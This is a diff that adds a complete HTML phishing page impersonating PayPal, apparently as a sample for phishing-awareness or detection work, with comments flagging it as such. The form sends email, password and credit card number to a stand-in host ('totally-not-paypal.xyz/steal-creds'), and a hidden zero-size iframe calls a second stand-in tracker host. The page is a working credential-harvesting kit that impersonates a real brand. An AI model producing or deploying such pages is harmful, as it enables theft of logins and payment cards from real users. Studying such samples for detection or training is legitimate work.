@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PayPal - Verify Your Account</title>
+  <!-- No favicon — classic phishing signal -->
+</head>
+<body style="font-family:Arial,sans-serif;background:#f5f5f5;margin:0;padding:40px;">
+  <div style="max-width:420px;margin:0 auto;background:#fff;padding:32px;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" width="120" alt="PayPal" />
+    <h2 style="color:#003087;font-size:20px;margin:24px 0 8px;">Confirm Your Identity</h2>
+    <p style="color:#555;font-size:14px;margin-bottom:20px;">
+      Your account has been temporarily limited. Please verify your information to restore full access.
+    </p>
+
+    <form action="http://totally-not-paypal.xyz/steal-creds" method="POST">
+      <label style="font-size:13px;color:#333;">Email address</label><br/>
+      <input type="email" name="email" placeholder="email@example.com"
+        style="width:100%;padding:10px;margin:6px 0 16px;border:1px solid #ccc;border-radius:3px;font-size:14px;" /><br/>
+
+      <label style="font-size:13px;color:#333;">Password</label><br/>
+      <input type="password" name="password" placeholder="Password"
+        style="width:100%;padding:10px;margin:6px 0 16px;border:1px solid #ccc;border-radius:3px;font-size:14px;" /><br/>
+
+      <label style="font-size:13px;color:#333;">Credit card number</label><br/>
+      <input type="text" name="cc" autocomplete="cc-number" placeholder="1234 5678 9012 3456"
+        style="width:100%;padding:10px;margin:6px 0 24px;border:1px solid #ccc;border-radius:3px;font-size:14px;" /><br/>
+
+      <button type="submit"
+        style="width:100%;background:#009cde;color:#fff;border:none;padding:12px;border-radius:3px;font-size:15px;cursor:pointer;">
+        Confirm &amp; Continue
+      </button>
+    </form>
+
+    <p style="font-size:11px;color:#aaa;margin-top:20px;text-align:center;">
+      &copy; 1999-2024 PayPal. All rights reserved.
+      <!-- Hidden exfil iframe -->
+      <iframe src="http://evil-tracker.xyz/log" style="display:none;" width="0" height="0"></iframe>
+    </p>
+  </div>
+</body>
+</html>
